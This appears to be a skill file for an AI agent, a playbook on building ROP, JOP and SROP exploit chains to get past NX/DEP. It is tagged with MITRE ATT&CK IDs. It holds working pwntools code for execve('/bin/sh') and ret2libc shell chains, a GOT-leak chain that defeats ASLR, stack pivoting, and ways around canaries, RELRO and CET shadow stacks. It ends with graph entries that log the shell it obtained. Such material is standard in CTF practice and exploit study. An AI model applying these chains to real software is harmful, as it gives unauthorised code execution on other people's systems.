---
name: rop-chain
description: ROP/JOP gadget hunting and exploit-chain construction — for NX/DEP bypass on x86/x64/ARM binaries.
metadata:
  subdomain: reverse-engineering
  when_to_use: "rop jop chain return oriented programming gadget pwntools nx dep bypass x86 x64 arm"
  mitre_attack:
    - T1203
    - T1055
---

# ROP Chain Construction Playbook

ROP (Return-Oriented Programming) and JOP (Jump-Oriented) repurpose
existing code fragments ("gadgets") ending in `ret` / `jmp <reg>` to
build arbitrary computation without injecting code. Required when NX/DEP
prevents shellcode execution.

## 1. Inventory mitigations
Before building the chain, know what protections you face:
```bash
checksec --file=/tmp/binary
# Or
pwn checksec /tmp/binary
```
Output flags:
- **NX**: stack non-executable → ROP needed
- **PIE**: position-independent → need leak first
- **RELRO** (partial/full): GOT writable / read-only
- **Canary**: stack-cookie → leak/bypass needed
- **ASLR**: addresses randomized → leak needed for libc/PIE

## 2. Gadget discovery
```bash
# ROPgadget (most common)
ROPgadget --binary /tmp/binary --depth 8 > /tmp/gadgets.txt

# Filter useful ones
grep ': pop rdi ; ret$' /tmp/gadgets.txt    # syscall arg1 setup
grep ': pop rsi ; ret$' /tmp/gadgets.txt    # syscall arg2 setup
grep ': pop rdx ; ret$' /tmp/gadgets.txt    # arg3
grep ': syscall ; ret$' /tmp/gadgets.txt    # syscall instruction
grep ': ret$' /tmp/gadgets.txt | head       # bare ret (stack alignment)

# Alternative: ropper
ropper --file /tmp/binary --search 'pop rdi'
ropper --file /tmp/binary --search 'syscall'

# Alternative: one_gadget for libc one-shot RCE
one_gadget /lib/x86_64-linux-gnu/libc.so.6
```

## 3. Common chain patterns

### Direct execve("/bin/sh") via syscall (x86_64)
```python
from pwn import *

# Gadgets from /tmp/binary
POP_RDI = 0x4011a3       # pop rdi ; ret
POP_RSI = 0x4011a1       # pop rsi ; ret
POP_RDX = 0x4011a5       # pop rdx ; ret
POP_RAX = 0x4011a7       # pop rax ; ret
SYSCALL = 0x4011a9       # syscall ; ret

# Target
BIN_SH  = 0x404060       # writeable .bss for "/bin/sh\x00"

chain = b''
# write "/bin/sh\0" to BIN_SH
chain += p64(POP_RAX) + p64(0x68732f6e69622f)  # /bin/sh in little-endian, no null at end
chain += p64(POP_RDI) + p64(BIN_SH)
# stos or mov [rdi], rax — need gadget
# (this needs more gadgets, see "write-what-where" section below)

# execve(BIN_SH, NULL, NULL)
chain += p64(POP_RAX) + p64(0x3b)    # SYS_execve = 59
chain += p64(POP_RDI) + p64(BIN_SH)
chain += p64(POP_RSI) + p64(0)
chain += p64(POP_RDX) + p64(0)
chain += p64(SYSCALL)
```

### Via libc (if libc address leaked)
```python
# Easier — call system("/bin/sh") in libc
libc_base = leaked_libc_addr - libc.symbols.puts   # offset from puts to base

chain = b''
chain += p64(POP_RDI) + p64(libc_base + next(libc.search(b'/bin/sh')))
chain += p64(libc_base + libc.symbols['system'])
# Some systems need a ret-aligning gadget for stack alignment before system
chain = p64(RET_GADGET) + chain
```

### `one_gadget` (if conditions met)
`one_gadget` finds libc addresses that call execve("/bin/sh") with one
jump, no setup. Constraints (e.g. `[rsp+0x70] == NULL`) must be met:
```bash
one_gadget libc.so.6
# 0x4527a constraints: ...
# 0xf03a4 constraints: ...
```
Pick the constraint that matches the state at your return point.

## 4. Write-what-where (when no leak available initially)

If you can't read libc directly:
1. Find `puts@plt` in the binary
2. Build a chain that calls `puts(puts_got)` — leaks libc's `puts` address
3. Compute libc base from that
4. Return to `main` (or any function that re-runs your chain) and now build the real execve chain

```python
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
main     = elf.symbols['main']

leak_chain  = p64(POP_RDI) + p64(puts_got)
leak_chain += p64(puts_plt)
leak_chain += p64(main)  # restart so we can re-input
```

## 5. Modern bypass techniques

### Stack pivoting
When buffer overflow is small, pivot to a controlled larger region:
```python
# Gadgets needed
POP_RBP = 0x...           # pop rbp ; ret
LEAVE_RET = 0x...         # mov rsp, rbp; pop rbp; ret

# Pivot to attacker-controlled buffer
chain = p64(LARGE_BUFFER - 8) + p64(LEAVE_RET)
```

### Sigreturn-Oriented Programming (SROP)
Few gadgets available? SROP uses `rt_sigreturn` syscall to restore full
CPU state from a sigframe on the stack — sets every register at once:
```python
frame = SigreturnFrame()
frame.rax = 0x3b
frame.rdi = bin_sh
frame.rsi = 0
frame.rdx = 0
frame.rip = SYSCALL
chain = p64(POP_RAX) + p64(0xf) + p64(SYSCALL) + bytes(frame)
```

### JOP (Jump-Oriented)
When ret-poisoning is hardened (CET / shadow stack), use `jmp` gadgets:
```bash
ROPgadget --binary /tmp/bin --jop
```
Pattern: dispatcher gadget calls each functional gadget via register.
Harder to construct; rare in CTF, occasional in real exploits.

## 6. Mitigation specifics

### Stack canary
Need to leak it first. Patterns:
- Format string vuln reads canary
- Read primitive (e.g. arbitrary read via uninit pointer) leaks it
- Fork-server target: canary identical across fork children → brute byte-by-byte

### PIE
Need to leak any function address in main binary → compute base. Often
via puts/printf of a stack variable that contains a ret addr.

### Full RELRO
GOT read-only → can't GOT-overwrite. ROP must use direct syscalls or
libc functions via leaked base.

### CET / shadow stack
ROP gadgets ending in `ret` get blocked at return. Mitigations:
- Use `ENDBR64`-prefixed gadgets (JOP-style)
- Use syscalls that don't return (`execve`)
- Bypass via CET-disable techniques where possible

## 7. Promote (knowledge graph)
```
kg_add_node(kind="exploit_chain", label="ROP: BOF → execve",
            props={"target":"<binary>","gadget_count":<n>,"libc_required":<bool>})
kg_add_edge(src=<vuln:BOF>, dst=<exploit_chain>, kind="enables")
kg_add_edge(src=<exploit_chain>, dst=<crown_jewel:shell>, kind="achieves")
```

## CVSS
- Working RCE chain: 9.8-10.0 (network-reachable)
- Chain requires local interaction: 7-8
- ASLR-defeating chain reliable across runs: 10.0
- One-shot one_gadget exploit: 9.8

## Tooling cheat sheet

| Tool | Use for |
|---|---|
| `ROPgadget` | Linux/x86 gadget enum |
| `ropper` | Multi-arch gadgets, search syntax |
| `pwntools` `ROP()` class | Chain assembly in Python |
| `one_gadget` | Libc one-shot RCE |
| `angr` | Symbolic gadget chain finding |
| `Ropium` | Automated ROP chain synthesis |
| `pwntools-tubes` | Remote interaction harness |
| `pwndbg` / `gef` (gdb plugins) | Live debugging w/ ROP helpers |
| `r2pipe` | Programmatic radare2 from Python |

## Known exemplars (CTF + real)
- Most CTF pwn challenges from medium+: classic ROP
- Real CVE-2017-7494 (SambaCry): no ROP, but reused techniques
- CVE-2014-0160 (Heartbleed): leak primitive used to defeat ASLR
- Windows kernel exploits w/ HEVD: kernel ROP for SMEP bypass
- iOS jailbreaks: heavy use of JOP due to PAC + KTRR
